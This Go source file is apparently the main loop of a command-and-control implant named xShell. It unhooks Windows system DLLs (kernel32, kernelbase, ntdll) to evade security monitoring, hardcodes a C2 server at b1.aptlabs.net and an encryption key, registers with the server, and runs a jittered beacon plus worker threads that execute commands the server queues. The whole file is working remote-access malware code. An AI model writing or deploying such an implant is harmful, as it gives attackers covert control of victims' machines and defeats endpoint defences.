package main

import (
	"fmt"
	"io"
	"os"
	"time"
	"xShell/payload/internal"

	"github.com/coremedic/goldr/pkg/evasion"
)

// TODO: pad keys
var KeyStr string = "thisismypassword" // must be 16, 24, 32 bytes
var C2Host string = "https://b1.aptlabs.net"

func main() {
	evasion.UnHookDll(`c:\windows\system32\kernel32.dll`)
	evasion.UnHookDll(`c:\windows\system32\kernelbase.dll`)
	evasion.UnHookDll(`c:\windows\system32\ntdll.dll`)
	internal.HttpLink.Host = C2Host
	internal.HttpLink.Key = []byte(KeyStr)
	id, err := getId()
	if err != nil {
		os.Exit(0)
	}
	fmt.Println(id)
	internal.HttpLink.Id = id
	beacon := internal.Beacon{
		Sleep:    15,
		Jitter:   10,
		HttpLink: &internal.HttpLink,
		Rqueue:   &internal.RequestQueue,
		Cqueue:   &internal.CommandQueue,
	}
	go beacon.Run()
	for {
		time.Sleep(1 * time.Second)
		if len(internal.CommandQueue.Queue) <= 0 {
			continue
		}
		wps := len(internal.Workers)
		switch {
		case wps <= 0:
			worker := newWorkerObj()
			internal.AddWorker(worker)
		case wps > 0 && wps < 5:
			purgeIdle()
		default:
			purgeIdle()
			killBlockedWorkers()
		}
	}
}

func purgeIdle() {
	ws := internal.GetAllStatus()
	for i, s := range ws {
		if s == "idle" {
			internal.StopWorker(i)
		}
	}
}

func killBlockedWorkers() {
	ws := internal.GetAllStatus()
	for i, s := range ws {
		if s == "running" {
			t, e := internal.GetWorkerTime(i)
			if e != nil {
				continue
			}
			td := time.Since(t).Minutes()
			if td >= 10 {
				internal.StopWorker(i)
			}
		}
	}
}

func getId() (string, error) {
	idReq, err := internal.HttpLink.NewIdRequest()
	if err != nil {
		return "", err
	}
	resp, err := internal.SendRequest(idReq)
	if err != nil {
		return "", err
	}
	if resp.Body == nil {
		return "", fmt.Errorf("error getting id")
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	decrypt, err := internal.SerpentDecrypt(body, internal.HttpLink.Key)
	if err != nil {
		return "", err
	}
	return string(decrypt), nil
}

func newWorkerObj() *internal.Worker {
	worker := internal.Worker{
		Sleep:      5,
		Link:       &internal.HttpLink,
		Rqueue:     &internal.RequestQueue,
		Cqueue:     &internal.CommandQueue,
		FuncPtrMap: internal.FuncPtrMap,
	}
	return &worker
}
